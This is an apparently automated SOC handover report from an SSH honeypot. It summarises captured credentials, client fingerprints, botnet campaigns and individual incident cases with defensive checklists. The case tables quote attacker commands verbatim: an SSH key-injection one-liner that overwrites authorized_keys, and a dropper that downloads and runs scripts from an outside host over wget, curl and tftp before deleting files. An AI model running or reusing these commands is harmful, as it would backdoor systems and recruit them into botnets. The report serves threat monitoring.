# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-04 |
| **Generated At** | 2026-10-04T16:08:12Z |
| **Shift Time** | 16:08 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **469** |
| Confirmed Threats | **436** |
| False Positives Filtered | **33** (7.0%) |
| Unique Attacker IPs | **295** |
| Countries of Origin | **53** |
| High Severity Cases | **297** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **172** |
| Malware Samples Analyzed | **5** HIGH · **25** MED · 13 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3710** |
| Unique Credential Pairs | **2782** |
| Unique Usernames | **1337** |
| Unique Passwords | **1555** |
| Successful Auth Pairs | **3554** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 714 |
| `ubuntu` | 179 |
| `admin` | 114 |
| `345gs5662d34` | 103 |
| `user` | 47 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 117 |
| `345gs5662d34` | 103 |
| `3245gs5662d34` | 103 |
| `123` | 56 |
| `1234` | 46 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 103 |
| `root` | `3245gs5662d34` | 40 |
| `root` | `` | 27 |
| `support` | `support` | 27 |
| `admin` | `admin` | 14 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `vpn` | `12345678` | `156.225.14.74` | 2026-10-04T03:00:08 |
| `345gs5662d34` | `345gs5662d34` | `156.225.14.74` | 2026-10-04T03:00:12 |
| `vpn` | `3245gs5662d34` | `156.225.14.74` | 2026-10-04T03:00:14 |
| `root` | `` | `94.154.43.69` | 2026-10-04T03:02:39 |
| `user1` | `1qaz2wsx` | `107.150.105.116` | 2026-10-04T03:03:09 |
| `345gs5662d34` | `345gs5662d34` | `107.150.105.116` | 2026-10-04T03:03:11 |
| `user1` | `3245gs5662d34` | `107.150.105.116` | 2026-10-04T03:03:11 |
| `root` | `cx@123456` | `41.93.28.23` | 2026-10-04T03:03:45 |
| `345gs5662d34` | `345gs5662d34` | `41.93.28.23` | 2026-10-04T03:03:49 |
| `root` | `3245gs5662d34` | `41.93.28.23` | 2026-10-04T03:03:51 |
| `support` | `support` | `10.0.0.73` | 2026-10-04T03:06:26 |
| `batman` | `batman123` | `45.224.97.244` | 2026-10-04T03:06:40 |
| `345gs5662d34` | `345gs5662d34` | `45.224.97.244` | 2026-10-04T03:06:42 |
| `batman` | `3245gs5662d34` | `45.224.97.244` | 2026-10-04T03:06:43 |
| `support` | `88` | `200.126.105.149` | 2026-10-04T03:06:48 |
| `geoserver` | `geoserver123` | `129.121.99.2` | 2026-10-04T03:06:51 |
| `345gs5662d34` | `345gs5662d34` | `129.121.99.2` | 2026-10-04T03:06:52 |
| `geoserver` | `3245gs5662d34` | `129.121.99.2` | 2026-10-04T03:06:52 |
| `support` | `88` | `103.191.204.229` | 2026-10-04T03:06:56 |
| `root` | `Root12#$` | `36.67.227.242` | 2026-10-04T03:08:27 |
_… 3534 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **469** |
| Sessions with Fingerprint | **26** |
| Unique HASSH Fingerprints | **26** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 200 |
| OpenSSH | 70 |
| Go SSH scanner | 44 |
| Paramiko (Python) | 6 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 176 | 90 |
| `acaa53e0a7d7...` | Mirai/variant | 46 | 45 |
| `03a80b21afa8...` | Modern SSH client | 17 | 9 |
| `2ec37a7cc8da...` | Mirai/variant | 8 | 3 |
| `16443846184e...` | Generic scanner | 7 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 176 | 90 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 46 | 45 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 22 | 15 | — |
| `03a80b21afa8...` | libssh | 17 | 9 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 8 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 7 | 3 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 6 | 3 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **25** |
| Campaign Clusters | **7** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 127 | 3 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 2 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 87 | 85 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 25 | 1 | `T1105, T1070, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 3 | 1 | `T1105, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 3 | 1 | `T1105, T1070, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "dev@2024\njaCWcRMqArTX\njaCWcRMqArTX"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `115.190.192.114`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.227`, `2.57.122.168`, `195.178.110.232`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `77.239.124.121`, `89.125.129.161`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **295** |
| Unique ASNs | **148** |
| High-Risk ASNs | **126** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 64 | HIGH |
| `AS4766` | Korea Telecom | 11 | HIGH |
| `AS396982` | Google LLC | 8 | HIGH |
| `AS8075` | Microsoft Corporation | 7 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 6 | HIGH |
| `AS4760` | HKT Limited | 5 | HIGH |
| `AS4811` | China Telecom (Group) | 5 | HIGH |
| `AS398324` | Censys, Inc. | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (294)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-88ef19d1cbcc

| Field | Detail |
|---|---|
| **Source IP** | `156.225.14[.]74` |
| **First Seen** | 2026-10-04 03:00 |
| **Last Seen** | 2026-10-04 03:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:00:07` | `cowrie.session.connect` |
| `2026-10-04 03:00:07` | `cowrie.client.version` |
| `2026-10-04 03:00:08` | `cowrie.client.kex` |
| `2026-10-04 03:00:08` | `cowrie.login.success` |
| `2026-10-04 03:00:09` | `cowrie.session.params` |
| `2026-10-04 03:00:09` | `cowrie.command.input` |
| `2026-10-04 03:00:09` | `cowrie.command.failed` |
| `2026-10-04 03:00:10` | `cowrie.log.closed` |
| `2026-10-04 03:00:11` | `cowrie.session.params` |
| `2026-10-04 03:00:11` | `cowrie.command.input` |
| `2026-10-04 03:00:11` | `cowrie.session.file_download` |
| `2026-10-04 03:00:11` | `cowrie.log.closed` |
| `2026-10-04 03:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.14[.]74` to AbuseIPDB if not already reported
- [ ] Block `156.225.14[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c39a8396b3f

| Field | Detail |
|---|---|
| **Source IP** | `156.225.14[.]74` |
| **First Seen** | 2026-10-04 03:00 |
| **Last Seen** | 2026-10-04 03:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:00:11` | `cowrie.session.connect` |
| `2026-10-04 03:00:11` | `cowrie.client.version` |
| `2026-10-04 03:00:11` | `cowrie.client.kex` |
| `2026-10-04 03:00:12` | `cowrie.login.success` |
| `2026-10-04 03:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.225.14[.]74` to AbuseIPDB if not already reported
- [ ] Block `156.225.14[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-b1e3785a82a7

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-10-04 03:02 |
| **Last Seen** | 2026-10-04 03:02 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:02:39` | `cowrie.session.connect` |
| `2026-10-04 03:02:39` | `cowrie.login.success` |
| `2026-10-04 03:02:40` | `cowrie.session.params` |
| `2026-10-04 03:02:41` | `cowrie.command.input` |
| `2026-10-04 03:02:41` | `cowrie.command.input` |
| `2026-10-04 03:02:41` | `cowrie.session.file_download` |
| `2026-10-04 03:02:41` | `cowrie.session.file_download` |
| `2026-10-04 03:02:41` | `cowrie.session.file_download` |
| `2026-10-04 03:02:42` | `cowrie.session.file_download` |
| `2026-10-04 03:02:42` | `cowrie.session.file_download.failed` |
| `2026-10-04 03:02:42` | `cowrie.session.file_download` |
| `2026-10-04 03:02:42` | `cowrie.session.file_download` |
| `2026-10-04 03:02:56` | `cowrie.log.closed` |
| `2026-10-04 03:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b94a56dd007b

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]116` |
| **First Seen** | 2026-10-04 03:03 |
| **Last Seen** | 2026-10-04 03:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:03:08` | `cowrie.session.connect` |
| `2026-10-04 03:03:08` | `cowrie.client.version` |
| `2026-10-04 03:03:08` | `cowrie.client.kex` |
| `2026-10-04 03:03:09` | `cowrie.login.success` |
| `2026-10-04 03:03:09` | `cowrie.session.params` |
| `2026-10-04 03:03:09` | `cowrie.command.input` |
| `2026-10-04 03:03:09` | `cowrie.command.failed` |
| `2026-10-04 03:03:10` | `cowrie.log.closed` |
| `2026-10-04 03:03:10` | `cowrie.session.params` |
| `2026-10-04 03:03:10` | `cowrie.command.input` |
| `2026-10-04 03:03:10` | `cowrie.session.file_download` |
| `2026-10-04 03:03:10` | `cowrie.log.closed` |
| `2026-10-04 03:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]116` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-869488d77e91

| Field | Detail |
|---|---|
| **Source IP** | `107.150.105[.]116` |
| **First Seen** | 2026-10-04 03:03 |
| **Last Seen** | 2026-10-04 03:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:03:10` | `cowrie.session.connect` |
| `2026-10-04 03:03:10` | `cowrie.client.version` |
| `2026-10-04 03:03:10` | `cowrie.client.kex` |
| `2026-10-04 03:03:11` | `cowrie.login.success` |
| `2026-10-04 03:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.105[.]116` to AbuseIPDB if not already reported
- [ ] Block `107.150.105[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0b95aab535

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-10-04 03:03 |
| **Last Seen** | 2026-10-04 03:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:03:43` | `cowrie.session.connect` |
| `2026-10-04 03:03:43` | `cowrie.client.version` |
| `2026-10-04 03:03:44` | `cowrie.client.kex` |
| `2026-10-04 03:03:45` | `cowrie.login.success` |
| `2026-10-04 03:03:46` | `cowrie.session.params` |
| `2026-10-04 03:03:46` | `cowrie.command.input` |
| `2026-10-04 03:03:46` | `cowrie.command.failed` |
| `2026-10-04 03:03:47` | `cowrie.log.closed` |
| `2026-10-04 03:03:47` | `cowrie.session.params` |
| `2026-10-04 03:03:47` | `cowrie.command.input` |
| `2026-10-04 03:03:48` | `cowrie.session.file_download` |
| `2026-10-04 03:03:48` | `cowrie.log.closed` |
| `2026-10-04 03:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49d0616dbab6

| Field | Detail |
|---|---|
| **Source IP** | `41.93.28[.]23` |
| **First Seen** | 2026-10-04 03:03 |
| **Last Seen** | 2026-10-04 03:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:03:48` | `cowrie.session.connect` |
| `2026-10-04 03:03:48` | `cowrie.client.version` |
| `2026-10-04 03:03:48` | `cowrie.client.kex` |
| `2026-10-04 03:03:49` | `cowrie.login.success` |
| `2026-10-04 03:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.93.28[.]23` to AbuseIPDB if not already reported
- [ ] Block `41.93.28[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73226ba3ec22

| Field | Detail |
|---|---|
| **Source IP** | `45.224.97[.]244` |
| **First Seen** | 2026-10-04 03:06 |
| **Last Seen** | 2026-10-04 03:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:06:39` | `cowrie.session.connect` |
| `2026-10-04 03:06:39` | `cowrie.client.version` |
| `2026-10-04 03:06:39` | `cowrie.client.kex` |
| `2026-10-04 03:06:40` | `cowrie.login.success` |
| `2026-10-04 03:06:40` | `cowrie.session.params` |
| `2026-10-04 03:06:40` | `cowrie.command.input` |
| `2026-10-04 03:06:40` | `cowrie.command.failed` |
| `2026-10-04 03:06:41` | `cowrie.log.closed` |
| `2026-10-04 03:06:41` | `cowrie.session.params` |
| `2026-10-04 03:06:41` | `cowrie.command.input` |
| `2026-10-04 03:06:41` | `cowrie.session.file_download` |
| `2026-10-04 03:06:41` | `cowrie.log.closed` |
| `2026-10-04 03:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.224.97[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.224.97[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132a480e4d66

| Field | Detail |
|---|---|
| **Source IP** | `45.224.97[.]244` |
| **First Seen** | 2026-10-04 03:06 |
| **Last Seen** | 2026-10-04 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:06:41` | `cowrie.session.connect` |
| `2026-10-04 03:06:41` | `cowrie.client.version` |
| `2026-10-04 03:06:42` | `cowrie.client.kex` |
| `2026-10-04 03:06:42` | `cowrie.login.success` |
| `2026-10-04 03:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.224.97[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.224.97[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4684861b0b4

| Field | Detail |
|---|---|
| **Source IP** | `200.126.105[.]149` |
| **First Seen** | 2026-10-04 03:06 |
| **Last Seen** | 2026-10-04 03:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:06:46` | `cowrie.session.connect` |
| `2026-10-04 03:06:47` | `cowrie.client.version` |
| `2026-10-04 03:06:47` | `cowrie.client.kex` |
| `2026-10-04 03:06:48` | `cowrie.login.success` |
| `2026-10-04 03:06:49` | `cowrie.direct-tcpip.request` |
| `2026-10-04 03:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.126.105[.]149` to AbuseIPDB if not already reported
- [ ] Block `200.126.105[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0130e3fbd16

| Field | Detail |
|---|---|
| **Source IP** | `129.121.99[.]2` |
| **First Seen** | 2026-10-04 03:06 |
| **Last Seen** | 2026-10-04 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-04 03:06:51` | `cowrie.session.connect` |
| `2026-10-04 03:06:51` | `cowrie.client.version` |
| `2026-10-04 03:06:51` | `cowrie.client.kex` |
| `2026-10-04 03:06:51` | `cowrie.login.success` |
| `2026-10-04 03:06:51` | `cowrie.session.params` |
| `2026-10-04 03:06:51` | `cowrie.command.input` |
| `2026-10-04 03:06:51` | `cowrie.command.failed` |
| `2026-10-04 03:06:51` | `cowrie.log.closed` |
| `2026-10-04 03:06:52` | `cowrie.session.params` |
| `2026-10-04 03:06:52` | `cowrie.command.input` |
| `2026-10-04 03:06:52` | `cowrie.session.file_download` |
| `2026-10-04 03:06:52` | `cowrie.log.closed` |
| `2026-10-04 03:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.99[.]2` to AbuseIPDB if not already reported
- [ ] Block `129.121.99[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
